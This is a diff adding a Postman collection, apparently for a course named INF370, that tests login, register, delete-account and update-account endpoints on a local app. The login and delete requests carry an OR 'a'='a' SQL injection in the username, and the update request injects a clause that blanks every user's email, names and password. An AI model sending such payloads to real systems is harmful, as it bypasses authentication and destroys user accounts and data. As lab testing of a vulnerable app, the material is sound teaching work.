@@ -1,0 +1,148 @@
+{
+	"info": {
+		"_postman_id": "27dad3a5-e3f1-4bd5-bd8e-5e5df8c21dfd",
+		"name": "INF370",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Login user",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/login?username=john' OR 'a'='a';--&password=john@123",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "john' OR 'a'='a';--"
+						},
+						{
+							"key": "password",
+							"value": "john@123"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Register user",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/register?username=ynv&password=john@123&first_name=john&last_name=doe&email=jdoe@gmail.com",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"register"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "ynv"
+						},
+						{
+							"key": "password",
+							"value": "john@123"
+						},
+						{
+							"key": "first_name",
+							"value": "john"
+						},
+						{
+							"key": "last_name",
+							"value": "doe"
+						},
+						{
+							"key": "email",
+							"value": "jdoe@gmail.com"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Delete user",
+			"request": {
+				"method": "DELETE",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/delete-account?username=john' OR 'a'='a';--&password=john@123",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"delete-account"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "john' OR 'a'='a';--"
+						},
+						{
+							"key": "password",
+							"value": "john@123"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Update user",
+			"request": {
+				"method": "PATCH",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"username\": \"john', email='', first_name='', last_name='', passwd='' WHERE 'a'='a';--\",\r\n    \"email\": \"\",\r\n    \"password\": \"\",\r\n    \"first_name\": \"\",\r\n    \"last_name\": \"\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/update-account",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"update-account"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
